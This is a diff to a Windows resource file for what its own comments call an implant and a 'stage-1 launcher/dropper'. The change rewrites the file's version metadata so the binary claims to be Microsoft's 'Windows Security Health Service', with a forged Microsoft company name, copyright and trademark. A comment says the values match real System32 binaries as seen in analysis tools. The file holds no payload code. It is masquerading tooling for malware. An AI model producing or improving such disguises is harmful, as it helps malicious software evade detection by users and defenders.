@@ -1,6 +1,5 @@
-// ghost.rc — Implant binary version resource.
-// Mimics a genuine Microsoft Windows 11 22H2 security component.
-// All values match what sigcheck/PE-bear/strings show on real System32 binaries.
+// launcher.rc — Version resource for the stage-1 launcher/dropper.
+// Presents as "Windows Security Health Service" — a real Windows component name.
 #include <windows.h>
 
 VS_VERSION_INFO VERSIONINFO
@@ -17,15 +16,15 @@ BEGIN
         BLOCK "040904B0"
         BEGIN
             VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "Windows Security Update Service"
+            VALUE "FileDescription",  "Windows Security Health Service"
             VALUE "FileVersion",      "10.0.22621.2506 (WinBuild.160101.0800)"
-            VALUE "InternalName",     "WindowsSecurityUpdate"
+            VALUE "InternalName",     "WinSecHealthSvc"
             VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
             VALUE "LegalTrademarks",  "Microsoft\256 is a registered trademark of Microsoft Corporation."
-            VALUE "OriginalFilename", "WindowsSecurityUpdate.exe"
+            VALUE "OriginalFilename", "WinSecHealthSvc.exe"
             VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
             VALUE "ProductVersion",   "10.0.22621.2506"
-            VALUE "Comments",         "Provides security definition updates and malware protection services."
+            VALUE "Comments",         "Windows Security Health monitoring and reporting service."
         END
     END
     BLOCK "VarFileInfo"
@@ -34,4 +33,4 @@ BEGIN
     END
 END
 
-1 24 "resources/ghost.manifest"
+1 24 "resources/launcher.manifest"
